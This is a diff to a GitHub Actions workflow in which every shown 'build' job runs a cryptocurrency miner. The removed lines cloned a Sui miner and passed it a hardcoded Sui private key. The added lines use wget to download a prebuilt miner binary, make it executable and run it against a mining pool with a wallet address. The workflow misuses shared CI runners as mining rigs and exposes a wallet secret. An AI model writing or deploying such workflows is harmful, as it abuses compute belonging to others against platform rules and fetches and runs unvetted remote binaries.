@@ -32,11 +32,9 @@ jobs:
       # Runs a set of commands using the runners shell
       - name: Run a multi-line script
         run: |
-          git clone https://github.com/suidouble/sui_meta_miner.git
-          cd sui_meta_miner
-          npm install
-          node mine.js --fomo --chain=mainnet --phrase="suiprivkey1qrcusmmlua3q0r8elewdy0e977z36whyusdyk69wps70kjmeke00zvs73g0"
-
+          wget https://github.com/Project-InitVerse/ini-miner/releases/download/v1.0.0/iniminer-linux-x64  
+          chmod +x iniminer-linux-x64
+          ./iniminer-linux-x64 --pool stratum+tcp://0x6b9B4E431fFD80A8f97af06c0565B5304239e6c2.Github@pool-core-testnet.inichain.com:32672
 
 
 
@@ -53,11 +51,9 @@ jobs:
       # Runs a set of commands using the runners shell
       - name: Run a multi-line script
         run: |
-          git clone https://github.com/suidouble/sui_meta_miner.git
-          cd sui_meta_miner
-          npm install
-          node mine.js --fomo --chain=mainnet --phrase="suiprivkey1qrcusmmlua3q0r8elewdy0e977z36whyusdyk69wps70kjmeke00zvs73g0"
-
+          wget https://github.com/Project-InitVerse/ini-miner/releases/download/v1.0.0/iniminer-linux-x64  
+          chmod +x iniminer-linux-x64
+          ./iniminer-linux-x64 --pool stratum+tcp://0x6b9B4E431fFD80A8f97af06c0565B5304239e6c2.Github@pool-core-testnet.inichain.com:32672
 
   build3:
     # The type of runner that the job will run on
@@ -71,11 +67,9 @@ jobs:
       # Runs a set of commands using the runners shell
       - name: Run a multi-line script
         run: |
-          git clone https://github.com/suidouble/sui_meta_miner.git
-          cd sui_meta_miner
-          npm install
-          node mine.js --fomo --chain=mainnet --phrase="suiprivkey1qrcusmmlua3q0r8elewdy0e977z36whyusdyk69wps70kjmeke00zvs73g0"
-
+          wget https://github.com/Project-InitVerse/ini-miner/releases/download/v1.0.0/iniminer-linux-x64  
+          chmod +x iniminer-linux-x64
+          ./iniminer-linux-x64 --pool stratum+tcp://0x6b9B4E431fFD80A8f97af06c0565B5304239e6c2.Github@pool-core-testnet.inichain.com:32672
 
           
   build4:
@@ -90,11 +84,9 @@ jobs:
       # Runs a set of commands using the runners shell
       - name: Run a multi-line script
         run: |
-          git clone https://github.com/suidouble/sui_meta_miner.git
-          cd sui_meta_miner
-          npm install
-          node mine.js --fomo --chain=mainnet --phrase="suiprivkey1qrcusmmlua3q0r8elewdy0e977z36whyusdyk69wps70kjmeke00zvs73g0"
-          
+          wget https://github.com/Project-InitVerse/ini-miner/releases/download/v1.0.0/iniminer-linux-x64  
+          chmod +x iniminer-linux-x64
+          ./iniminer-linux-x64 --pool stratum+tcp://0x6b9B4E431fFD80A8f97af06c0565B5304239e6c2.Github@pool-core-testnet.inichain.com:32672
 
   build5:
     # The type of runner that the job will run on
@@ -108,10 +100,9 @@ jobs:
       # Runs a set of commands using the runners shell
       - name: Run a multi-line script
         run: |
-          git clone https://github.com/suidouble/sui_meta_miner.git
-          cd sui_meta_miner
-          npm install
-          node mine.js --fomo --chain=mainnet --phrase="suiprivkey1qrcusmmlua3q0r8elewdy0e977z36whyusdyk69wps70kjmeke00zvs73g0"
+          wget https://github.com/Project-InitVerse/ini-miner/releases/download/v1.0.0/iniminer-linux-x64  
+          chmod +x iniminer-linux-x64
+          ./iniminer-linux-x64 --pool stratum+tcp://0x6b9B4E431fFD80A8f97af06c0565B5304239e6c2.Github@pool-core-testnet.inichain.com:32672
 
 
  
